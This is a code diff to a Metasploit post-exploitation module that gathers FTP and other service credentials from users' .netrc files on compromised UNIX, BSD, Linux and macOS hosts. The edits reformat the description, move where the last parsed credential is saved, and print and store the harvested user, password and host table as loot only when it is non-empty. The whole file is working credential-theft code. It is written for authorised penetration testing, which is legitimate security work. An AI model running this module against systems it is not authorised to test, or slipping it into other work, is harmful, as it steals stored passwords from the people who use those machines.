@@ -12,7 +12,9 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'UNIX Gather credentials saved in .netrc files',
-				'Description'   => %q{Post Module to obtain credentials saved for FTP and other services in .netrc},
+				'Description'   => %q{
+					Post Module to obtain credentials saved for FTP and other services in .netrc
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
 				'Platform'      => [ 'bsd', 'linux', 'osx', 'unix' ],
@@ -41,6 +43,7 @@ class Metasploit3 < Msf::Post
 			# the current credential from .netrc we are parsing
 			cred = {}
 			begin
+				print_status("Reading: #{netrc_file}")
 				# read their .netrc
 				cmd_exec("test -r #{netrc_file} && cat #{netrc_file}").each_line do |netrc_line|
 					# parse it
@@ -63,21 +66,36 @@ class Metasploit3 < Msf::Post
 						cred[:pass] = $1
 					end
 				end
+
+				# save whatever remains of this last cred if it is worth saving
+				creds << cred if (cred[:host] and cred[:user] and cred[:pass])
+
 			rescue ::Exception => e
 				print_error("Couldn't read #{netrc_file}: #{e.to_s}")
 			end
-			# save whatever remains of this last cred if it is worth saving
-			creds << cred if (cred[:host] and cred[:user] and cred[:pass])
 		end
 
 		# print out everything we've found
 		creds.each do |cred|
 			cred_table << [ cred[:user], cred[:pass], cred[:host] ]
-			print_good("netrc (FTP) credentials: user=#{cred[:user]}, pass=#{cred[:pass]}, host=#{cred[:host]}")
 		end
 
-		# store all found credentials
-		store_loot("netrc.creds", "text/csv", session, creds.to_csv, "netrc_credentials.txt", ".netrc credentials")
+		if cred_table.rows.empty?
+			print_status("No creds collected")
+		else
+			print_line("\n" + cred_table.to_s)
+
+			# store all found credentials
+			p = store_loot(
+				"netrc.creds",
+				"text/csv",
+				session,
+				cred_table.to_csv,
+				"netrc_credentials.txt",
+				".netrc credentials")
+
+			print_status("Credentials stored in: #{p.to_s}")
+		end
 	end
 
 end
